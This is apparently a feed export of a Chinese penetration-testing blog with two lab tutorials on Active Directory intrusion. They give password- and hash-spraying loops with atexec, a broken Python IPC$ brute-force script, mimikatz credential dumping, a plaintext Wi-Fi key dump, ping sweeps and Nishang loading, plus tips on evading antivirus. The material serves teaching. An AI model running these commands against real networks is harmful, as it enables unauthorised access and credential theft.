class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里获取到system权限后，可以重复以上操作，通过mimikatz不断的获取本地的密码，进而去获取域内用户的权限。（这里atexec.exe容易被查杀，可以做免杀，也可以通过计划任务等等获取权限） </p></blockquote><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627221312045.png" alt="image-20220627221312045"></p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627221258715.png" alt="image-20220627221258715"></p><p>3.31的ip返回system。</p><h3 id="0x02-批量检测明文对应"><a href="#0x02-批量检测明文对应" class="headerlink" title="0x02 批量检测明文对应"></a>0x02 批量检测明文对应</h3><pre class="line-numbers language-none"><code class="language-none">FOR &#x2F;F %i in (pass.txt) do atexec.exe .&#x2F;administrator:Hacker123@%i whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>流程：</p><p>1.先获取系统权限</p><p>2.将mimikatz复制到对方主机</p><p>3.运行mimikatz获取明文或者哈希密码</p><p>4.将获取到的密码添加到爆破字典 </p></blockquote><h3 id="0x03-批量检测HASH对应"><a href="#0x03-批量检测HASH对应" class="headerlink" title="0x03 批量检测HASH对应"></a>0x03 批量检测HASH对应</h3><pre class="line-numbers language-none"><code class="language-none">FOR &#x2F;F %i in (hash.txt) do atexec.exe -hashes :%i .&#x2F;administrator@192.168.3.21 whoami <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x04-明文-HASH传递-批量利用-升级版"><a href="#0x04-明文-HASH传递-批量利用-升级版" class="headerlink" title="0x04 明文-HASH传递 批量利用-升级版"></a>0x04 明文-HASH传递 批量利用-升级版</h2><p>遍历多个变量，比如IP、用户名、密码等，可以写python脚本，免杀，使用Pyinstaller打包成exe文件，上传到目标机器运行。</p><pre class="line-numbers language-none"><code class="language-none">1、安装pyinstall:pip install pyinstall2、生成可执行EXE：pyinstaller -F fuck_neiwang_001.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">improt os<span class="token punctuation">,</span>tips<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'192.168.3.25'</span><span class="token punctuation">,</span>    <span class="token string">'192.168.3.29'</span><span class="token punctuation">,</span>    <span class="token string">'192.168.3.30'</span><span class="token punctuation">,</span>    <span class="token string">'192.168.3.21'</span><span class="token punctuation">,</span>    <span class="token string">'192.168.3.31'</span><span class="token punctuation">&#125;</span>users<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'Administrator'</span><span class="token punctuation">,</span>    <span class="token string">'dbamain'</span><span class="token punctuation">,</span>    <span class="token string">'admin'</span><span class="token punctuation">&#125;</span><span class="token keyword">pass</span><span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'admin'</span><span class="token punctuation">.</span>    <span class="token string">'admin123'</span>    <span class="token string">'hacker'</span>    <span class="token string">'hacker123'</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> ip <span class="token keyword">in</span> ips<span class="token punctuation">:</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">for</span> mima <span class="token keyword">in</span> <span class="token keyword">pass</span><span class="token punctuation">:</span>        <span class="token keyword">exec</span><span class="token operator">=</span><span class="token string">"net use \\"</span><span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">'ipc$'</span><span class="token operator">+</span>mima<span class="token operator">+</span><span class="token string">'/user:test\\'</span><span class="token operator">+</span>user        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--->'</span><span class="token operator">+</span><span class="token keyword">exec</span><span class="token operator">+</span><span class="token string">'&lt;---'</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全-域环境与工作组及局域网探针</title>
      <link href="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/"/>
      <url>/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.png" alt="内网渗透"></p><h2 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01 基本知识"></a>0x01 基本知识</h2><p>###0x00 网络拓扑</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626172050975.png" alt="image-20220626172050975"></p><h3 id="0x01-DMZ（非军事）区域"><a href="#0x01-DMZ（非军事）区域" class="headerlink" title="0x01 DMZ（非军事）区域"></a>0x01 DMZ（非军事）区域</h3><p>DMZ，是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p><h3 id="0x02-工作组-amp-域环境"><a href="#0x02-工作组-amp-域环境" class="headerlink" title="0x02 工作组&amp;域环境"></a>0x02 工作组&amp;域环境</h3><p>1、工作组：地位平等，管理分散，没有集中管理。（范围小的计算机在局域网内）</p><p>2、域环境：地位不平等，管理集中，实现集中管理。（共享文件，不需要每台计算机去配置用户进行访问，可以直接访问）</p><p>3、域环境也可以简单的理解为工作组的升级版，更好管理。</p><p>4、这里我们把域环境和工作组区分开来是因为他们的攻击手段不同：工作组中的攻击手法如DNS劫持、ARP欺骗在域环境下是没有作用的。有一些攻击手段需要一些条件，这些条件在域环境下没有，相应的攻击手段就会失效。</p><h3 id="0x03-域控制器DC"><a href="#0x03-域控制器DC" class="headerlink" title="0x03 域控制器DC"></a>0x03 域控制器DC</h3><p>域控DC是这个域中的管理者，域里面的最高权限，判断是否拿下整个域，就是看你是否拿下这台域控制器。</p><h3 id="0x04-AD活动目录"><a href="#0x04-AD活动目录" class="headerlink" title="0x04 AD活动目录"></a>0x04 AD活动目录</h3><p>1、AD是微软所提供的目录服务（查询，身份验证）,活动目录的核心包含了活动目录数据库。</p><p>2、在活动目录数据库中包含了域中所有的对象（用户，计算机，组…），活动目录(Active Directory)是面向Windows Standard Server、Windows Enterprise Server 以及Windows Datacenter Server的目录服务。</p><p>3、Active Directory储存了有关网络对象的信息，并且让管理员和用户能够轻松的查找和使用这些信息。</p><h3 id="0x05-单域"><a href="#0x05-单域" class="headerlink" title="0x05 单域"></a>0x05 单域</h3><p>网络由主域管理器和任意数量的代理程序组成（公司都在一起，都在这个域内）</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626173330174.png" alt="image-20220626173330174"></p><p>可以将单域网络与其它网络（单域或多域）组合以满足多站点的需求</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626173410737.png" alt="image-20220626173410737"></p><h3 id="0x06-父域和子域"><a href="#0x06-父域和子域" class="headerlink" title="0x06 父域和子域"></a>0x06 父域和子域</h3><p>总公司和分公司的关系，总公司可以管分公司</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626173754565.png" alt="image-20220626173754565"></p><p>图片来源：<a href="https://cloud.tencent.com/developer/news/226717">https://cloud.tencent.com/developer/news/226717</a></p><h3 id="0x07-域树和域林"><a href="#0x07-域树和域林" class="headerlink" title="0x07 域树和域林"></a>0x07 域树和域林</h3><p>1、域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。树中的域通过信任关系连接起来，活动目录包含一个或多个域树</p><p>2、域林是指由一个或多个没有形成连续名字空间的域树组成，它与上面所讲的域树最明显的区别就在于这些域树之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p><h3 id="0x08-Linux域渗透问题"><a href="#0x08-Linux域渗透问题" class="headerlink" title="0x08 Linux域渗透问题"></a>0x08 Linux域渗透问题</h3><p>1、Linux上也有相应的活动目录的，不过要装LDAP环境，一般企很少会用LDAP来管理的，因为功能上不及域强大，而且用linux来管理的话要求技术人员门槛也比较高，Linux还是比较适合做服务器好一点。</p><p>（就是说Linux上面的域环境需要环境支撑，而且功能没有windows上的域强大，所以大部分我们遇见的都是windows，这也是没有Linux的原因。当然，Linux这个操作系统也是可以加入域的，比如域内有Linux的操作系统，有Linux的服务器也行，只是很少）</p><p>###0x09 局域网技术适用问题</p><p>1、广播风暴</p><p>2、ARP断网攻击</p><p>3、DNS欺骗</p><p>4、IP冲突攻击</p><p>5、路由无线攻击</p><p>6、……</p><p>##0x01 实例</p><h3 id="0x00-环境介绍"><a href="#0x00-环境介绍" class="headerlink" title="0x00 环境介绍"></a>0x00 环境介绍</h3><p>图中属于单域环境，Windows2008R2作为域控DC，有五个域成员主机；</p><p>1、fileserver文件服务器、SqlServer数据库服务器、webserver网站服务器和两台个人PC。他们都是在192.168.3.0这个网段</p><p>2、网站服务器有两个网卡，一个在3.31一个在230.131，这个230.133就好比是它的一个对外出口（外网接口）</p><p>3、kali攻击机就好比攻击者，它通过230.131这个接口进入网站服务器计算机，由于这台计算机是处于内网连接（这里没有DMZ），所有它享有3这个网段的访问权限。</p><p>4、拿下网站服务器后的首要攻击目标就是DC！只要拿下DC，也就相当于同时拿下了所有域成员主机权限。</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626175536721.png" alt="image-20220626175536721"></p><h3 id="0x01-系统信息搜集"><a href="#0x01-系统信息搜集" class="headerlink" title="0x01 系统信息搜集"></a>0x01 系统信息搜集</h3><p>假设已经拿下了内网web服务器，进行信息搜集：</p><p>1、systeminfo命令查看webserver详细信息（操作系统版本、补丁编号等信息）。</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626195344631.png" alt="image-20220626195344631"></p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626195512262.png" alt="image-20220626195512262"></p><p>2、net start 启动服务（查看当前主机开启了哪些服务，从服务中就可以判断它是什么角色，比如说文件传输、数据库等等）</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626195650087.png" alt="image-20220626195650087"></p><p>3、tasklist 进程列表（查看当前主机开启了哪些进程）</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626195730023.png" alt="image-20220626195730023"></p><p>4、schtasks 计划任务（若报错无法加载列资源，说明你的权限不够，因此要提权才能使用该命令）</p><p><strong>（计划任务是以system权限运行）</strong></p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626195818885.png" alt="image-20220626195818885"></p><h3 id="0x02-网络信息搜集"><a href="#0x02-网络信息搜集" class="headerlink" title="0x02 网络信息搜集"></a>0x02 网络信息搜集</h3><p><strong>为了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</strong></p><p>1、ipconfig &#x2F;all 判断存在域-最简单方式查看主DNS后缀</p><p>和DNS域名解析一样，Test.test.com为sqlserver. Test.test.com的父域名</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626200309372.png" alt="image-20220626200309372"></p><p>2、net view &#x2F;domain 判断存在域</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626200943830.png" alt="image-20220626200943830"></p><p>服务器测试失败；正确结果如下图：<br><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626201456143.png" alt="image-20220626201456143"></p><p>会出现GOD这个是域名（图来源于互联网）。</p><p>本机执行：<br><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626201618878.png" alt="image-20220626201618878"></p><p>3、net time &#x2F;domain 判断主域（主域就是域控的意思）</p><p>因为域成员计算机的时间一般会以域控制器为准，所以当执行net time &#x2F;domain命令时，该计算机会去域控获取时间；此时返回的WIN-75NA0949GFB.Test.test.com就是域控的计算机全名。然后可以通过nslookup来最终确认域控IP：<br><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626201958351.png" alt="image-20220626201958351"></p><p>可以通过nslookup和ping命令获取域控的对应ip地址，域控主机ip为3.21：</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626202411227.png" alt="image-20220626202411227"></p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626202519577.png" alt="image-20220626202519577"></p><p>4、netstat -ano 当前网络端口开放</p><h3 id="0x03-用户信息收集"><a href="#0x03-用户信息收集" class="headerlink" title="0x03 用户信息收集"></a>0x03 用户信息收集</h3><p><strong>为了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试系统默认常见用户身份</strong></p><p>1、系统默认常见用户身份：</p><blockquote><p>Domain Admins：域管理员（默认对域控制器有完全控制权）</p><p>Domain Computers：域内机器</p><p>Domain Controllers：域控制器</p><p>Domain Guest：域访客，权限低</p><p>Domain Users：域用户</p><p>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</p></blockquote><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626203000076.png" alt="image-20220626203000076"></p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626203021945.png" alt="image-20220626203021945"></p><p>2、相关用户收集操作命令：</p><blockquote><p>whoami &#x2F;all 用户权限</p><p>net config workstation 登录信息</p><p>net user 本地用户</p><p>net localgroup 本地用户组</p><p>net user &#x2F;domain 获取域用户信息</p><p>net group &#x2F;domain 获取域用户组信息</p><p>wmic useraccount get &#x2F;all 涉及域用户详细信息</p><p>net group “Domain Admins” &#x2F;domain 查询域管理员账户</p><p>net group “Enterprise Admins” &#x2F;domain 查询管理员用户组</p><p>net group “Domain Controllers” &#x2F;domain 查询域控制器</p></blockquote><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626203416949.png" alt="image-20220626203416949"></p><p>其他命令也如此，搜集相关信息。</p><p>进行计算机管理时，发现需要验证本地管理员的密码（域成员（webadmin）的权限不够，需要域管理员（Administrator）或者本地管理员才行）</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626203556930.png" alt="image-20220626203556930"></p><h3 id="0x04-凭据信息收集"><a href="#0x04-凭据信息收集" class="headerlink" title="0x04 凭据信息收集"></a>0x04 凭据信息收集</h3><p><strong>为了收集各种密文，明文，口令等，为后续横向渗透做好测试准备</strong></p><blockquote><p>计算机用户 HASH，明文获取脚本：mimikatz(win)，mimipenguin(linux)</p><p>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)</p><p>Netsh WLAN show profiles</p><p>Netsh WLAN show profile name&#x3D;”无线名称” key&#x3D;clear</p><p>1.站点源码备份文件、数据库备份文件等</p><p>2.各类数据库 Web 管理入口，如 PHPMyAdmin</p><p>3.浏览器保存密码、浏览器 Cookies4.其他用户会话、3389 和 ipc$连接记录、回收站内容</p><p>5.Windows 保存的 WIFI 密码</p><p>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等 </p></blockquote><p>1、mimikatz：windows获取脚本</p><p>直接在Webserver的webadmin用户运行会报错（mimikatz运行需要域管理员权限，域用户无法运行，因为权限不够）</p><p>执行：privilege::debug</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626213812597.png" alt="image-20220626213812597"></p><p>再执行：sekurlsa::logonpasswords</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626214041409.png" alt="image-20220626214041409"></p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626213935709.png" alt="image-20220626213935709"></p><p>会以明文形式返回各种关键信息。</p><p>2、mimipenguin：linux获取以上信息的脚本。</p><p>3、LaZagne(all)：通杀脚本，（windows，linux，mac）</p><p>（不能直接点击运行会闪退，要在命令行里面运行）</p><p>采用 all参数运行：</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626220517370.png" alt="image-20220626220517370"></p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626220710869.png" alt="image-20220626220710869"></p><p>4、XenArmor国外软件（$40-$50）</p><p>下载地址：<a href="https://xenarmor.com/allinone-password-recovery-pro-software/%EF%BC%88%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%81WiFi%E3%80%81FTP%E7%9A%84%E5%AF%86%E7%A0%81%E9%83%BD%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%EF%BC%89">https://xenarmor.com/allinone-password-recovery-pro-software/（浏览器、WiFi、FTP的密码都可以发现）</a></p><blockquote><p><strong>这两个软件主要是通过自动化翻找以下内容，从而获取凭据</strong></p><p>1.站点源码备份文件、数据库备份文件等</p><p>2.各类数据库 Web 管理入口，如 PHPMyAdmin</p><p>3.浏览器保存密码、浏览器 Cookies</p><p>4.其他用户会话、3389 和 ipc$连接记录、回收站内容</p><p>5.Windows 保存的 WIFI 密码</p><p>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等探针主机域控架构服务操作演示 </p></blockquote><h2 id="0x02-探针主机域控架构服务操作演示"><a href="#0x02-探针主机域控架构服务操作演示" class="headerlink" title="0x02 探针主机域控架构服务操作演示"></a>0x02 探针主机域控架构服务操作演示</h2><p><strong>为后续横向思路做准备，针对应用，协议等各类攻击手法</strong></p><p>###0x00</p><p>1、探针域控制器名及地址信息：</p><p>net time &#x2F;domain</p><p> nslookup ping</p><p>2、探针域内存活主机及地址信息：</p><p>nbtscan 192.168.3.0&#x2F;24 第三方工具（类似于nmup）</p><p>下载地址：<a href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a> </p><p>3、<code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot;</code>（用for循环去ping1-254网段的主机，这是自带内部命令，不会被杀毒软件拦截）</p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626221542516.png" alt="image-20220626221542516"></p><h3 id="0x01NiShang简介"><a href="#0x01NiShang简介" class="headerlink" title="0x01NiShang简介"></a>0x01NiShang简介</h3><p>1、利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。</p><p>2、Nishang是基于PowerShell的渗透测试专用工具。它集成了框架、脚本和各种payload，能够帮助渗透测试人员在对Windows目标的全过程检测中使用，是一款来源于作者实战经历的智慧结晶。（类似于MSF）</p><h3 id="0x02-NiShang使用"><a href="#0x02-NiShang使用" class="headerlink" title="0x02 NiShang使用"></a>0x02 NiShang使用</h3><p><strong>powershell运行</strong></p><blockquote><p>首先导入模块 ：<br>Import-Module .\nishang.psm1</p></blockquote><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626222413681.png" alt="image-20220626222413681"></p><p>无法加载；</p><blockquote><p>设置执行策略：</p><p>Set-ExecutionPolicy RemoteSigned</p></blockquote><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626222727299.png" alt="image-20220626222727299"></p><blockquote><p>导入模块：</p><p>Import-Module .\nishang.psm1</p></blockquote><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626222713804.png" alt="image-20220626222713804"></p><blockquote><p>获取模块 nishang 的命令函数：</p><p>Get-Command -Module nishang （每个参数对应一个功能模块）</p></blockquote><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626222941069.png" alt="image-20220626222941069"></p><p><img src="/2022/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88/image-20220626222928037.png" 